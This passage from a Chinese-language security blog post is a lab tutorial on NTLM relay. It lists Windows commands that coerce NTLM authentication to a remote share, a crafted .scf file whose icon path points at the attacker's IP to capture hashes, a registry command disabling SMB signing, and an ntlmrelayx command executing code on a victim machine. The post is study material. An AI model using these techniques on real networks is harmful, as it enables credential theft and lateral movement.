+<p>​	NTLM是一个嵌入式协议，消息的传输依赖于使用ntlm的上层协议，比如SMB,LDAP,HTTP等，那ntlm的上层协议是smb的情况下,ntlm_relay就是smb_relay。那如果上层协议是http，我们也可以叫做http_relay，但是都统称ntlm_relay。消息的传输依赖于使用ntlm的上层协议，比如SMB,LDAP,HTTP等,那不管上层协议是啥，ntlm的认证总归是type 1,type 2,type3 。所以我们就不局限于之前提到的smb到smb这种relay，</p>
+<p>原理如图：</p>
+<img src="/img/24-11-2/11.png">
+
+<p>ntlm relay的原理可以简述为，存在一个中间人，也就是攻击者，然后客户端认为他是服务端，服务端认为他是客户端。所以全程客户端都在和攻击者进行交互，然后攻击者将获得到的信息拿来和服务端交互，所以服务端认为攻击者是客户端，这样也就达到了伪造客户端进行认证的目的。</p>
+<p>关键点在于让受害者将Net-NTLM Hash 传递给攻击者,或者说是成为中间人</p>
+<p>有几个技术可以做到：</p>
+<ul>
+<li>ARP欺骗</li>
+<li>DNS 欺骗</li>
+<li>Windows IPv6 堆栈的错误配置</li>
+<li>NTBS (NetBIOS) / LLMNR 欺骗</li>
+</ul>
+<p>其实上面我现在只知道ARP欺骗</p>
+<p>通过上面手段，获取到的是Net-NTLM Hash</p>
+<p>Responder 是一款使用 Python 编写用于毒化 LLMNR 和 NBT-NS 请求的一款工具。</p>
+<p>Responder 项目地址：<a target="_blank" rel="noopener" href="https://github.com/lgandx/Responder">https://github.com/lgandx/Responder</a></p>
+<p>Responder并不支持Windows</p>
+<p><strong>NTBS 和 LLMNR欺骗</strong></p>
+<p>在另外一篇中已经提到：<a href="https://yyjccc.github.io/2024/10/10/LLMNR%E4%B8%8ENBTNS%E5%92%8CMDNS%E6%AC%BA%E9%AA%97/">LLMNR\NBT-NS\MDNS欺骗</a></p>
+<p>事实上，在<a target="_blank" rel="noopener" href="https://www.vaadata.com/en/infrastructure-network-pentest/">网络渗透测试</a>期间，上面提到的方法可能会失败，因为网络的自动发现协议被禁用。</p>
+<p>Relay攻击在现实中也很难实现，关键点在与对于受害者的钓鱼，让受害者主动发起NTLM请求</p>
+<h3 id="发起NTLM请求"><a href="#发起NTLM请求" class="headerlink" title="发起NTLM请求"></a>发起NTLM请求</h3><h4 id="网络命令"><a href="#网络命令" class="headerlink" title="网络命令"></a>网络命令</h4><p>使受害者发送NTLM请求</p>
+<p>下面一些命令可以让受害者发送NTLM请求</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">&gt; net.exe use \hostshare </span><br><span class="line">&gt; attrib.exe \hostshare  </span><br><span class="line">&gt; bcdboot.exe \hostshare  </span><br><span class="line">&gt; bdeunlock.exe \hostshare  </span><br><span class="line">&gt; cacls.exe \hostshare  </span><br><span class="line">&gt; certreq.exe \hostshare <span class="comment">#(noisy, pops an error dialog) </span></span><br><span class="line">&gt; certutil.exe \hostshare  </span><br><span class="line">&gt; cipher.exe \hostshare  </span><br><span class="line">&gt; ClipUp.exe <span class="literal">-l</span> \hostshare  </span><br><span class="line">&gt; cmdl32.exe \hostshare  </span><br><span class="line">&gt; cmstp.exe /s \hostshare  </span><br><span class="line">&gt; colorcpl.exe \hostshare <span class="comment">#(noisy, pops an error dialog)  </span></span><br><span class="line">&gt; comp.exe /N=<span class="number">0</span> \hostshare \hostshare  </span><br><span class="line">&gt; compact.exe \hostshare  </span><br><span class="line">&gt; control.exe \hostshare  </span><br><span class="line">&gt; convertvhd.exe <span class="literal">-source</span> \hostshare <span class="literal">-destination</span> \hostshare  </span><br><span class="line">&gt; Defrag.exe \hostshare  </span><br><span class="line">&gt; diskperf.exe \hostshare  </span><br><span class="line">&gt; dispdiag.exe <span class="literal">-out</span> \hostshare  </span><br><span class="line">&gt; doskey.exe /MACROFILE=\hostshare  </span><br><span class="line">&gt; esentutl.exe /k \hostshare  </span><br><span class="line">&gt; expand.exe \hostshare  </span><br><span class="line">&gt; extrac32.exe \hostshare  </span><br><span class="line">&gt; FileHistory.exe \hostshare <span class="comment">#(noisy, pops a gui)  </span></span><br><span class="line">&gt; findstr.exe * \hostshare  </span><br><span class="line">&gt; fontview.exe \hostshare <span class="comment">#(noisy, pops an error dialog)  </span></span><br><span class="line">&gt; fvenotify.exe \hostshare <span class="comment">#(noisy, pops an access denied error)  </span></span><br><span class="line">&gt; FXSCOVER.exe \hostshare <span class="comment">#(noisy, pops GUI)  </span></span><br><span class="line">&gt; hwrcomp.exe <span class="literal">-check</span> \hostshare  </span><br><span class="line">&gt; hwrreg.exe \hostshare  </span><br><span class="line">&gt; icacls.exe \hostshare   </span><br><span class="line">&gt; licensingdiag.exe <span class="literal">-cab</span> \hostshare  </span><br><span class="line">&gt; lodctr.exe \hostshare  </span><br><span class="line">&gt; lpksetup.exe /p \hostshare /s  </span><br><span class="line">&gt; makecab.exe \hostshare  </span><br><span class="line">&gt; msiexec.exe /update \hostshare /quiet  </span><br><span class="line">&gt; msinfo32.exe \hostshare <span class="comment">#(noisy, pops a "cannot open" dialog)  </span></span><br><span class="line">&gt; mspaint.exe \hostshare <span class="comment">#(noisy, invalid path to png error)  </span></span><br><span class="line">&gt; msra.exe /openfile \hostshare <span class="comment">#(noisy, error)  </span></span><br><span class="line">&gt; mstsc.exe \hostshare <span class="comment">#(noisy, error)  </span></span><br><span class="line">&gt; netcfg.exe <span class="literal">-l</span> \hostshare <span class="literal">-c</span> p <span class="literal">-i</span> foo</span><br></pre></td></tr></tbody></table></figure>
+
+<p>通过让受害者执行上面命令，可以在responder中获取到Net-NTLM Hash值</p>
+<h4 id="系统图标"><a href="#系统图标" class="headerlink" title="系统图标"></a>系统图标</h4><p>这种方式比较鸡肋，不好钓鱼</p>
+<p>每个文件夹底下都有个文件desktop.ini来指定文件夹图标之类的，默认不可见，可以通过在控制面板中去掉”隐藏受保护的操作系统文件”看到</p>
+<p>资源管理器-&gt; 查看 -&gt; 选项 （win10）</p>
+<img src="/img/24-11-2/12.png">
+
+<p>每个文件夹底下都会有，我们新建一个新的文件夹的话，如果没看到desktop.ini，可以尝试更改图标，就可以看到了</p>
+<img src="/img/24-11-2/13.png">
+
+<p>之后将图标路径改成UNC路径，指向我们的服务器,（改成网络路径）</p>
+<img src="/img/24-11-2/14.png">
+
+
+
+<img src="/img/24-11-2/15.png">
+
+
+
+<h4 id="SCF文件利用"><a href="#SCF文件利用" class="headerlink" title="SCF文件利用"></a>SCF文件利用</h4><p>scf文件包含了IconFile属性，所以Explore.exe会尝试获取文件的图标，而IconFile是支持UNC路径的，以下是scf后缀的文件的格式</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">[<span class="type">Shell</span>]</span><br><span class="line">Command=<span class="number">2</span></span><br><span class="line">IconFile=\\<span class="number">192.168</span>.<span class="number">120.140</span>\scf\test.ico</span><br><span class="line">[<span class="type">Taskbar</span>]</span><br><span class="line">Command=ToggleDesktop</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p>新建test.scf，之后写入以上内容并将其放在一个文件夹底下，当用户访问该文件夹的时候，我们就会获得用户的net-ntlm hash</p>
+<h4 id="构造pdf"><a href="#构造pdf" class="headerlink" title="构造pdf"></a>构造pdf</h4><p>PDF规范允许为GoTobe和GoToR条目加载远程内容，PDF文件可以添加一项功能，请求远程SMB服务器的文件，我们直接使用三好学生的脚本<a target="_blank" rel="noopener" href="https://github.com/3gstudent/Worse-PDF">https://github.com/3gstudent/Worse-PDF</a></p>
+<p>当受害者使用PDF阅读器打开恶意的PDF时可导致载荷成功执行，并返回NTLM-Hash</p>
+<p>其他方式还有构造word，设置用户图像等等，就不细看了，可以参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13124?time__1311=GqmhqUxoGKGNDQtiQY0QiMG2GDk3IAeD#toc-10">https://xz.aliyun.com/t/13124?time__1311=GqmhqUxoGKGNDQtiQY0QiMG2GDk3IAeD#toc-10</a></p>
+<p>和</p>
+<p><a target="_blank" rel="noopener" href="https://daiker.gitbook.io/windows-protocol/ntlm-pian/5">发起NTLM 请求 | windows protocol</a></p>
+<h3 id="Net-NTLM-Relay"><a href="#Net-NTLM-Relay" class="headerlink" title="Net-NTLM Relay"></a>Net-NTLM Relay</h3><h4 id="SMB-Relay"><a href="#SMB-Relay" class="headerlink" title="SMB-Relay"></a>SMB-Relay</h4><p>懂的，中继,Relay,重放是一个意思</p>
+<p>条件：relay到smb服务要求被攻击机器不能开启SMB签名，域内主机的 SMB 签名默认关闭，但域控是默认开启的</p>
+<blockquote>
+<p>在SMB连接中需要使用安全机制来保护服务器和客户端之间传输数据的完整性，而这种安全机制就是SMB签名和加密，如果关闭SMB签名，会允许攻击者拦截认证过程并且将获得hash在其他机器上进行重放，从而获得域管权限，目前SMB常用来做为SMB文件共享、打印机，如果签名关闭可能导致文件共享、打印机被入侵</p>
+</blockquote>
+<p>使用nmap查看是否关闭SMB签名</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">nmap <span class="literal">-n</span> <span class="literal">-p445</span> <span class="number">192.168</span>.<span class="number">120.135</span> <span class="literal">--script</span>=smb<span class="literal">-security-mode</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>关闭签名</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters /v RequireSecuritySignature /t REG_DWORD /d <span class="number">0</span> /f</span><br></pre></td></tr></tbody></table></figure>
+
+<blockquote>
+<p>SMB-Relay又分为在工作组环境下和在域环境下，但是一般工作组环境下比较少。</p>
+<ol>
+<li>工作组环境：在工作组环境中，工作组中的机器之间相互没有信任关系，每台机器的账号密码只是保存在自己的SAM文件中，这个时候Relay到别的机器，除非两台机器的账号密码一样，不然没有别的意义了。但是如果账号密码相同的话，为何不直接Pass The Hash攻击呢？因此在工作组环境下，Relay到其他机器不太现实。这个时候的攻击手段就是将机器Relay回机子本身。因此微软在ms08-068中对Relay到自身机器做了限制，严禁Relay到机器自身。CVE-2019-1384(Ghost Potato)就是绕过了该补丁。</li>
+<li>域环境：在域环境中，默认普通域用户可以登录除域控外的其他所有机器(但是为了安全，企业运维人员通常会限制域用户登录的主机)，因此可以将Net-NTLM Hash Relay到域内的其他机器。如果是拿到了域控机器的Net-NTLM Hash，可以Relay到除域控外的其他所有机器(为啥不Relay到其他域控，因为域内只有域控默认开启SMB签名)。</li>
+</ol>
+</blockquote>
+<p>因为工作组环境的适用环境比较少，这里主要讨论下域环境下的。</p>
+<p>可以检查注册表</p>
+<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManWorkstation\Parameters</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/img/24-11-2/16.png">
+
+
+
+<p>所以攻击场景为：拿下了域控，然后smb-relay域内其他主机</p>
+<p>开启SMBv1协议（pass）</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">Enable-WindowsOptionalFeature</span> <span class="literal">-Online</span> <span class="literal">-FeatureName</span> smb1protocol</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p>嗯，实际好像在用SMB2 (Win10)</p>
+<p>环境：</p>
+<ul>
+<li>Win10 : 192.168.120.135</li>
+<li>Windows Server 2019 : 192.168.120.139</li>
+<li>kali : 192.168.120.140</li>
+</ul>
+<p>试过网上的几种方法</p>
+<p>responder 中的MultiRelay.py, kali自带的smbrelayx.py都不行，</p>
+<p>自带的没有支持smb2协议</p>
+<p><strong>impacket</strong></p>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/fortra/impacket/tree/master">https://github.com/fortra/impacket/tree/master</a></p>
+<p>切换到examples目录</p>
+<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">python3 ntlmrelayx.py -t 192.168.120.135 -c whoami  -smb2support</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<img src="/img/24-11-2/17.png">
+
+<p>这里只能使用http</p>
+<p>通过社工手段让域控访问攻击者ip并输入用户密码（或者是已经拿下域控）</p>
+<img src="/img/24-11-2/18.png">
+
+<p>这里需要域管的账号，否则后面可能报没有权限的错误</p>
+<img src="/img/24-11-2/19.png">
+
+<p>这里可以发现smb认证成功了，但是好像没有执行命令</p>
+<p>登上win10看看，发现是被Windows安全中心拦截了</p>
+<img src="/img/24-11-2/20.png">
+
+<p>手动关闭Windows安全中心病毒防护</p>
+<img src="/img/24-11-2/21.png">
+
+<p>经历千辛万苦，折磨了半天，终于命令执行成功了，拿下了system权限</p>
+<p>后续可以上cs马等等</p>
+<p>当然这里的细节就涉及具体的漏洞，像MS08-068，CVE-2015-0005等等</p>
+<p>可以参考：<a target="_blank" rel="noopener" href="https://daiker.gitbook.io/windows-protocol/ntlm-pian/7#id-2.-cve-2015-0005">漏洞概述 | windows protocol</a></p>
+<p>其他没有提到的利用，可以参考：<a target="_blank" rel="noopener" href="https://daiker.gitbook.io/windows-protocol/ntlm-pian/6">Net- NTLM 利用 | windows protocol</a></p>
+<h2 id="后序"><a href="#后序" class="headerlink" title="后序"></a>后序</h2><p>本篇就介绍了NTLM的认证协议，Net-NTLM Hash，PTH ,NTLM-Relay 等等，其中肯定还有许多的东西只提及到一点点，像PTH,NTLM Relay其他攻击方式，SMB -Relay的其他漏洞等等</p>
+<p>这位师傅写的就比较全:<a target="_blank" rel="noopener" href="https://en.hackndo.com/ntlm-relay/">https://en.hackndo.com/ntlm-relay/</a></p>
+<p>以后若再遇到，再更新</p>
+<p>这也大致了解了NTLM-Hash 和Net-NTLM Hash 的一些利用手法</p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://daiker.gitbook.io/windows-protocol/ntlm-pian/4">NTLM 基础 介绍 | windows protocol (gitbook.io)</a></li>
+<li><a target="_blank" rel="noopener" href="https://en.hackndo.com/pass-the-hash/#protocol-ntlm">https://en.hackndo.com/pass-the-hash/#protocol-ntlm</a></li>
+<li><a target="_blank" rel="noopener" href="https://en.hackndo.com/ntlm-relay/">https://en.hackndo.com/ntlm-relay/</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12627">https://xz.aliyun.com/t/12627</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.vaadata.com/blog/understanding-ntlm-authentication-and-ntlm-relay-attacks/">https://www.vaadata.com/blog/understanding-ntlm-authentication-and-ntlm-relay-attacks/</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8117">https://xz.aliyun.com/t/8117</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13124">https://xz.aliyun.com/t/13124</a></li>
+<li><a target="_blank" rel="noopener" href="https://exp10it.io/2019/07/smb-%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB/">https://exp10it.io/2019/07/smb-%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB/</a></li>
+<li><a target="_blank" rel="noopener" href="https://qingwan.top/2024/01/23/ntlm%20relay">https://qingwan.top/2024/01/23/ntlm%20relay</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yokan/p/16102699.html">https://www.cnblogs.com/yokan/p/16102699.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://tttang.com/archive/1548/#toc_0x003-smbrelayxpy">https://tttang.com/archive/1548/#toc_0x003-smbrelayxpy</a></li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/NTLM/" rel="tag">NTLM</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/Windows/" rel="tag">Windows</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E5%8D%8F%E8%AE%AE/" rel="tag">协议</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" rel="tag">横向移动</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+    
+  <nav id="article-nav" data-aos="fade-up">
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        <img data-src="/images/cover/4.jpg" data-sizes="auto" alt="PE文件结构" class="lazyload">
+      
+      <a href="/2024/10/30/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          PE文件结构
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+  
+</article>
+
+
+
+
+  <div id="comments" class="gtcomment"></div>
+
+
+
+</section>
+          
+            <aside id="sidebar">
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Local-account"><span class="toc-number">1.1.</span> <span class="toc-text">Local account</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Domain-account"><span class="toc-number">1.2.</span> <span class="toc-text">Domain account</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NTLM%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81"><span class="toc-number">2.</span> <span class="toc-text">NTLM身份验证</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8D%8F%E5%95%86"><span class="toc-number">2.1.</span> <span class="toc-text">1. 协商</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B4%A8%E8%AF%A2"><span class="toc-number">2.2.</span> <span class="toc-text">2.质询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81"><span class="toc-number">2.3.</span> <span class="toc-text">3.身份验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Net-ntlm-hash"><span class="toc-number">2.4.</span> <span class="toc-text">Net-ntlm hash</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PTH"><span class="toc-number">3.</span> <span class="toc-text">PTH</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NTLM-Hash-%E8%8E%B7%E5%8F%96"><span class="toc-number">3.1.</span> <span class="toc-text">NTLM Hash 获取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hash-%E4%BC%A0%E9%80%92%E6%96%B9%E5%BC%8F"><span class="toc-number">3.2.</span> <span class="toc-text">Hash 传递方式</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Mimikatz"><span class="toc-number">3.2.0.1.</span> <span class="toc-text">Mimikatz</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NTLM-Relay%E6%94%BB%E5%87%BB"><span class="toc-number">4.</span> <span class="toc-text">NTLM Relay攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">4.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%91%E8%B5%B7NTLM%E8%AF%B7%E6%B1%82"><span class="toc-number">4.2.</span> <span class="toc-text">发起NTLM请求</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4"><span class="toc-number">4.2.1.</span> <span class="toc-text">网络命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%9B%BE%E6%A0%87"><span class="toc-number">4.2.2.</span> <span class="toc-text">系统图标</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SCF%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8"><span class="toc-number">4.2.3.</span> <span class="toc-text">SCF文件利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0pdf"><span class="toc-number">4.2.4.</span> <span class="toc-text">构造pdf</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Net-NTLM-Relay"><span class="toc-number">4.3.</span> <span class="toc-text">Net-NTLM Relay</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SMB-Relay"><span class="toc-number">4.3.1.</span> <span class="toc-text">SMB-Relay</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E5%BA%8F"><span class="toc-number">5.</span> <span class="toc-text">后序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">6.</span> <span class="toc-text">Reference</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Yyjccc" class="lazyload">
+  <div class="sidebar-author-name">Yyjccc</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">44</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">6</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">67</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/Yyjccc itemprop="url" target="_blank" aria-label="github"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">首页</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">归档</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">关于</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">友链</div>
+    </div>
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  
+</aside>
+
+          
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2023-2024
+      <span class="footer-info-sep"></span>
+      Yyjccc
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        153k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        10:24
+      </div>
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        <div class="sidebar-top">
+          <img src="/images/taichi.png" height="50" width="50" alt="backtop" />
+          <div class="arrow-up"></div>
+        </div>
+        <div id="mask"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Local-account"><span class="toc-number">1.1.</span> <span class="toc-text">Local account</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Domain-account"><span class="toc-number">1.2.</span> <span class="toc-text">Domain account</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NTLM%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81"><span class="toc-number">2.</span> <span class="toc-text">NTLM身份验证</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8D%8F%E5%95%86"><span class="toc-number">2.1.</span> <span class="toc-text">1. 协商</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B4%A8%E8%AF%A2"><span class="toc-number">2.2.</span> <span class="toc-text">2.质询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81"><span class="toc-number">2.3.</span> <span class="toc-text">3.身份验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Net-ntlm-hash"><span class="toc-number">2.4.</span> <span class="toc-text">Net-ntlm hash</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PTH"><span class="toc-number">3.</span> <span class="toc-text">PTH</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NTLM-Hash-%E8%8E%B7%E5%8F%96"><span class="toc-number">3.1.</span> <span class="toc-text">NTLM Hash 获取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hash-%E4%BC%A0%E9%80%92%E6%96%B9%E5%BC%8F"><span class="toc-number">3.2.</span> <span class="toc-text">Hash 传递方式</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Mimikatz"><span class="toc-number">3.2.0.1.</span> <span class="toc-text">Mimikatz</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NTLM-Relay%E6%94%BB%E5%87%BB"><span class="toc-number">4.</span> <span class="toc-text">NTLM Relay攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">4.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%91%E8%B5%B7NTLM%E8%AF%B7%E6%B1%82"><span class="toc-number">4.2.</span> <span class="toc-text">发起NTLM请求</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4"><span class="toc-number">4.2.1.</span> <span class="toc-text">网络命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%9B%BE%E6%A0%87"><span class="toc-number">4.2.2.</span> <span class="toc-text">系统图标</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SCF%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8"><span class="toc-number">4.2.3.</span> <span class="toc-text">SCF文件利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0pdf"><span class="toc-number">4.2.4.</span> <span class="toc-text">构造pdf</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Net-NTLM-Relay"><span class="toc-number">4.3.</span> <span class="toc-text">Net-NTLM Relay</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SMB-Relay"><span class="toc-number">4.3.1.</span> <span class="toc-text">SMB-Relay</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E5%BA%8F"><span class="toc-number">5.</span> <span class="toc-text">后序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">6.</span> <span class="toc-text">Reference</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Yyjccc" class="lazyload">
+  <div class="sidebar-author-name">Yyjccc</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">44</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">6</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">67</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-github sidebar-social-icon">
